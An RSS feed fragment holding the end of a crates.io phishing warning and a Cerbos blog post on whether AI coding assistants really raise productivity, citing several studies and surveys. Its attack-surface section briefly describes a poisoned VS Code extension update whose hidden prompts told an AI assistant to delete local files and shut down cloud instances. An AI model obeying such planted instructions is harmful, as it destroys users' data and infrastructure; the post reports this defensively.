</p><div><p>We received multiple reports of a phishing campaign targeting crates.io users (from the <code>rustfoundation.dev</code> domain name), mentioning a compromise of our infrastructure and asking users to authenticate to limit damage to their crates.</p><p>These emails are malicious and come from a domain name not controlled by the Rust Foundation (nor the Rust Project), seemingly with the purpose of stealing your GitHub credentials. We have no evidence of a compromise of the crates.io infrastructure.</p><p>We are taking steps to get the domain name taken down and to monitor for suspicious activity on crates.io. Do not follow any links in these emails if you receive them, and mark them as phishing with your email provider.</p><p>If you have any further questions please reach out to <a href="https://blog.rust-lang.orgmailto:security@rust-lang.org">security@rust-lang.org</a> and <a href="https://blog.rust-lang.orgmailto:help@crates.io">help@crates.io</a>.</p></div></section>]]></description><pubDate>Sat, 13 Sep 2025 14:10:48 +0530</pubDate></item><item><link>https://www.cerbos.dev/blog/productivity-paradox-of-ai-coding-assistants</link><title>The productivity paradox of AI coding assistants (cerbos.dev)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nf9buo/the_productivity_paradox_of_ai_coding_assistants/</guid><comments>https://www.reddit.com/r/programming/comments/1nf9buo/the_productivity_paradox_of_ai_coding_assistants/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 13 min | <a href='https://www.reddit.com/r/programming/comments/1nf9buo/the_productivity_paradox_of_ai_coding_assistants/'>Post permalink</a></p></section><section class='preview-image'><img src='https://stylish-appliance-1c1cc1c30d.media.strapiapp.com/The_productivity_paradox_of_AI_coding_assistants_1fb36a40a2.png' /></section><section class='parsed-content'><div><p>Our development team at Cerbos is split into two camps. One side uses AI coding help like Cursor or Claude Code and sees it as the fastest way to ship. The other side has the typical &ldquo;meh&rdquo; reaction you often see on Reddit, arguing that AI assistance is mostly a racket.</p><p>Some of us lean on AI coding to push side projects faster into the delivery pipeline. These are not core product features but experiments and MVP-style initiatives. For bringing that kind of work to its first version, the speed-up is real.</p><p>AI coding assistants promise less boilerplate, fewer doc lookups, and quicker iteration. From my perspective, they deliver on that promise when building MVPs, automations, and hobby projects. Outside of those use cases, the picture changes. You may feel like you are moving quickly, but getting code production ready often takes longer.</p><p>Let&rsquo;s dig into the data.</p><ol> <li><a href="https://www.cerbos.dev#dopamine-vs.-reality">Dopamine vs. reality</a></li> <li><a href="https://www.cerbos.dev#the-quality-problem">The quality problem</a></li> <li><a href="https://www.cerbos.dev#so-where-is-the-magical-10x-productivity-boost?">So where is the magical 10x productivity boost?</a></li> <li><a href="https://www.cerbos.dev#security-is-where-the-gap-shows-most-clearly">Security is where the gap shows most clearly</a></li> <li><a href="https://www.cerbos.dev#how-ai-assistants-create-new-attack-surfaces">How AI assistants create new attack surfaces</a></li> <li><a href="https://www.cerbos.dev#the-70%25-problem">The 70% problem</a></li> <li><a href="https://www.cerbos.dev#business-opinion-vs.-developer-opinion">Business opinion vs. developer opinion</a></li> </ol> <h2><strong>Dopamine vs. reality</strong> <a></a></h2><p>AI coding assistants feel productive because they give instant feedback. You type a prompt and code drops in right away. That loop feels like progress, the same reward you get from closing a ticket or fixing a failing test. The problem is that dopamine rewards activity in the editor, not working code in production.</p><p>The METR randomized <a href="https://metr.org/blog/2025-07-10-early-2025-ai-experienced-os-dev-study/">trial</a> in July 2025 with experienced open source developers showed how strong this illusion is. Half the group had AI tools, the other half coded without them. Participants mainly used Cursor Pro with Claude 3.5 and 3.7 Sonnet, which we use internally as well. Developers using AI were on average 19% slower. Yet they were convinced they had been faster.</p><ul> <li>Before starting, they predicted AI would make them 24% faster.</li> <li>After finishing, even with slower results, they still believed AI had sped them up by ~20%<strong>.</strong></li> </ul><p>The chart below from the study makes the point clearly. The green dots show developer expectations and self-reports, while the red dots show actual performance. AI coding &ldquo;felt faster&rdquo;, but in reality, it slowed experienced developers down.</p><p>Marcus Hutchins described this perfectly in his <a href="https://malwaretech.com/2025/08/every-reason-why-i-hate-ai.html">essay</a>:</p><p><em>&ldquo;LLMs inherently hijack the human brain&rsquo;s reward system&hellip; LLMs give the same feeling of achievement one would get from doing the work themselves, but without any of the heavy lifting.&rdquo;</em></p><p>That gap between perception and reality is the productivity placebo. It also shows up in the 2025 Stack Overflow Developer <a href="https://survey.stackoverflow.co/2025/ai#ai-agents">Survey</a>. Only 16.3% of developers said AI made them more productive to a great extent. The largest group, 41.4%, said it had little or no effect. Most developers were in the middle, reporting &ldquo;somewhat&rdquo; better output. That lines up with the METR findings. AI feels faster, but the measurable gains are marginal or even negative.</p><h2><strong>The quality problem</strong> <a></a></h2><p>Speed is one thing, but quality is another. Developers who have used AI assistants in long sessions see the same pattern: output quality gets worse the more context you add. The model starts pulling in irrelevant details from earlier prompts, and accuracy drops. This effect is often called context rot.</p><p>More context is not always better. In theory, a bigger context window should help, but in practice, it often distracts the model. The result is bloated or off-target code that looks right but does not solve the problem you are working on.</p><p>In the Stack Overflow Developer Survey of more than 90,000 developers, 66% said the most common frustration with AI assistants is that the code is &ldquo;almost right, but not quite.&rdquo; Another 45.2% pointed to time spent debugging AI-generated code.</p><p>That lines up with what most of us see in practice. As one of my teammates from the dev team mentioned in our discussion: &ldquo;A lot of the positive sentiments you&rsquo;d read about online are likely because the problems these people are solving are repetitive, boilerplate-y problems solved a gazillion times before. I don&rsquo;t trust the code output from an agent... It&rsquo;s dangerous and (in the rare case that the code is effective) an instant tech-debt factory. That said, I do sometimes find it a useful way of asking questions about a codebase, a powerful grokking tool if you will&rdquo;. I can&rsquo;t agree more.</p><h2><strong>So where is the magical 10x productivity boost?</strong> <a></a></h2><p>The claim that AI makes developers 10x more productive gets repeated pretty often. But the math does not hold up. A 10x boost means what used to take three months now takes a week and a half. Anyone who has actually shipped complex software knows that it is impossible.</p><p>The bottlenecks are not typing speed. They are design reviews, PR queues, test failures, context switching, and waiting on deployments.</p><p>Let&rsquo;s look at some interesting research. In 2023, GitHub and Microsoft ran <a href="https://arxiv.org/abs/2302.06590">a controlled experiment</a> where developers were asked to implement a small HTTP server in JavaScript. Developers using Copilot finished the task <strong>55.8% faster</strong> than the control group. The setup was closer to a benchmark exercise than day-to-day work, and most of the gains came from less experienced devs who leaned on the AI for scaffolding. And, obviously, those were vendor-run experiments.</p><p>METR tested the opposite scenario. Senior engineers worked in large OSS repositories that they already knew well. In that environment, the minutes saved on boilerplate were wiped out by time spent reviewing, fixing, or discarding AI output. As one of my teammates put it, you&rsquo;re not actually saving time with AI coding; you&rsquo;re just trading less typing for more time reading and untangling code.</p><p>Even when AI enables parallelism, one more research shows the cost is more juggling, more reviews, not less time to ship. In July 2025, Faros AI <a href="https://go.faros.ai/ai-engineering">analyzed</a> telemetry from over 10,000 developers across 1,255 teams. They found that teams with high AI adoption interacted with 9% more tasks and 47% more pull requests per day. Developers were juggling more parallel workstreams because AI could scaffold multiple tasks at once.</p><p>Historically, context switching is a negative indicator, correlated with cognitive overload and reduced focus. Faros points out that developers spend more time orchestrating and validating AI contributions across streams. That extra juggling cancels out much of the speed-up you get in typing.</p><p>Not all findings are negative. In 2024, <a href="https://economics.mit.edu/sites/default/files/inline-files/draft_copilot_experiments.pdf">researchers</a> from MIT, Harvard, and Microsoft ran large-scale field experiments across three companies: Microsoft, Accenture, and a Fortune 100 firm. The sample covered 4,867 professional developers working on production code.</p><p>With access to AI coding tools, developers completed 26.08% more tasks on average compared to the control group. Junior and newer hires adopted the tools more readily and showed the largest productivity boost:</p><ul> <li>Senior developers, especially those already familiar with the codebase and stack, saw little or no measurable speed-up.</li> <li>The boost was strongest in situations where devs lacked prior context and used the AI to scaffold, fill in boilerplate, or cut down on docs lookups.</li> </ul><p>These gains &#128070; were good but not near 10x.</p><h2><strong>Security is where the gap shows most clearly</strong> <a></a></h2><p>With the core focus of our company on <a href="https://www.cerbos.dev/product-cerbos-hub">permission management</a> for humans and machines, we naturally look at AI coding assistance through a security lens.</p><p>Older data from 2023 found that developers using assistants shipped more vulnerabilities because they trusted the output too much (<a href="https://arxiv.org/pdf/2211.03622">Stanford research</a>). Obviously, in 2025, fewer developers would trust AI-generated code.</p><p>However, Apiiro&rsquo;s 2024 research is actually very alarming. It showed AI-generated code introduced <strong>322% more privilege escalation paths</strong> and <strong>153% more design flaws</strong> compared to human-written code.</p><p>Apiiro&rsquo;s 2024 research also found:</p><ul> <li><p>AI-assisted commits were merged into production 4x faster than regular commits, which meant insecure code bypassed normal review cycles.</p></li> <li><p>Projects using assistants showed a 40% increase in secrets exposure, mostly hard-coded credentials and API keys generated in scaffolding code. Accidentally pasting API keys, tokens, or configs into an AI assistant is one of the top risks. Even if rotated later, those secrets are now in someone else&rsquo;s logs.</p></li> <li><p>AI-generated changes were linked to a 2.5x higher rate of critical vulnerabilities (CVSS 7.0+) flagged later in scans.</p></li> <li><p>Review complexity went up significantly: PRs with AI code required 60% more reviewer comments on security issues.</p></li> </ul><p>And it is not just security; it is <a href="https://www.cerbos.dev/blog/staying-compliant">compliance</a> too. If code, credentials, or production data leave your environment through an AI assistant, you cannot guarantee deletion or control over where that data ends up. For organizations under SOC2, ISO, GDPR, or HIPAA, that can mean stepping outside policy or outright violations. This is exactly the kind of blind spot CISOs worry about.</p><h2><strong>How AI assistants create new attack surfaces</strong> <a></a></h2><p>AI coding assistants don&rsquo;t just generate code. They also bring new runtimes, plugins, and extensions into the developer workflow. That extra surface means more places where things can go wrong and attackers have already started exploiting them:</p><ul> <li><p>In July 2025, Google&rsquo;s Gemini CLI shipped with a bug that let attackers trigger arbitrary code execution on a dev machine. The tool that was supposed to speed up coding workflows basically turned into a local RCE vector.</p></li> <li><p>A year earlier, the Amazon Q extension in VS Code (August 2024) carried a poisoned update. Hidden prompts in the release told the assistant to delete local files and even shut down AWS EC2 instances. Because the extension shipped with broad local and cloud permissions, the malicious instructions executed without barriers.</p></li> </ul><p>These incidents highlight specific failures, but the bigger issue is structural. Coding assistants expand the software supply chain and increase the number of privileged connections that can be abused.</p><p>The diagram below, from Jim Gumbley and Lilly Ryan&rsquo;s piece on <a href="https://martinfowler.com/articles/exploring-gen-ai/software-supply-chain-attack-surface.html">Martin Fowler</a>, maps this new attack surface. It shows how agents, MCP servers, file systems, CI/CD, and LLM backends are all interconnected, each link a potential entry point for context poisoning or privilege escalation.</p><h2><strong>The 70% problem</strong> <a></a></h2><p>I loved Addy Osmani&rsquo;s piece in <a href="https://newsletter.pragmaticengineer.com/p/how-ai-will-change-software-engineering">Pragmatic Engineer</a> because it nailed what many developers see. AI can get you 70% of the way, but the last 30% is the hard part. The assistant scaffolds a feature, but production readiness means edge cases, architecture fixes, tests, and cleanup:</p><p>For juniors, 70% feel magical. For seniors, the last 30% is often slower than writing it clean from the start. That is why METR&rsquo;s experienced developers were slower with AI; they already knew the solution, and the assistant just added friction.</p><p>This is the difference between a demo and production. AI closes the demo gap quickly, but shipping to production still belongs to humans. A demo only has to run once. Production code has to run a million times without breaking. Humans at least know what they want, even if they misunderstand requirements. An LLM has no intent, which is why the final 30% always falls apart.</p><p>Our team also flagged another issue. Patterns you learn while vibe coding with these tools often break with every model update. There is no stable base to build on. Engineering needs determinism, not shifting patterns that collapse the moment the model retrain.</p><h2><strong>Business opinion vs. developer opinion</strong> <a></a></h2><p>The story of the &ldquo;10x engineer&rdquo; has always been more appealing in boardrooms than in code reviews. Under pressure to do more with less, it is tempting for leadership to see AI as a multiplier that could let one team ship the work of ten. The current AI hype plays straight into that narrative.</p><p>Developers, though, know where the real bottlenecks are. No AI collapses design discussions, sprint planning, meetings, or QA cycles. It does not erase tech debt or magically handle system dependencies. The reality is incremental speed-ups in boilerplate, not 10x multipliers across the delivery pipeline.</p><p>Engineers and EMs both need the same thing &mdash; software that is secure, reliable, and production-ready. AI can play a role in getting there, but only when expectations are grounded in how development actually works.</p><hr><p>Shameless plug: If you are working on IAM and permission management, our product <strong><a href="https://www.cerbos.dev/product-cerbos-hub">Cerbos Hub</a></strong> handles fine-grained authorization for humans and machines. Enforce contextual and continuous access control across apps, APIs, services, workloads, MCP servers, and AI agents &mdash; all from one place.</p></div><div class="gallery"><p><img src="https://stylish-appliance-1c1cc1c30d.media.strapiapp.com/AI_coding_research_1_930ab08028.png"></p><p><img src="https://stylish-appliance-1c1cc1c30d.media.strapiapp.com/AI_agents_productivity_90254da6a3.png"></p><p><img src="https://stylish-appliance-1c1cc1c30d.media.strapiapp.com/AI_tools_frustraton_a93d1fb96a.png"></p><p><img src="https://stylish-appliance-1c1cc1c30d.media.strapiapp.com/Context_switching_with_AI_0b5971d327.png"></p><p><img src="https://stylish-appliance-1c1cc1c30d.media.strapiapp.com/AI_coding_security_risks_fda1644620.png"></p><p><img src="https://stylish-appliance-1c1cc1c30d.media.strapiapp.com/AI_tools_supply_chain_risks_95a478012a.png"></p><p><img src="https://stylish-appliance-1c1cc1c30d.media.strapiapp.com/AI_productivity_issues_d2047e21b0.png"></p></div></section>]]></description><pubDate>Fri, 12 Sep 2025 22:57:32 +0530</pubDate></item></channel></rss>
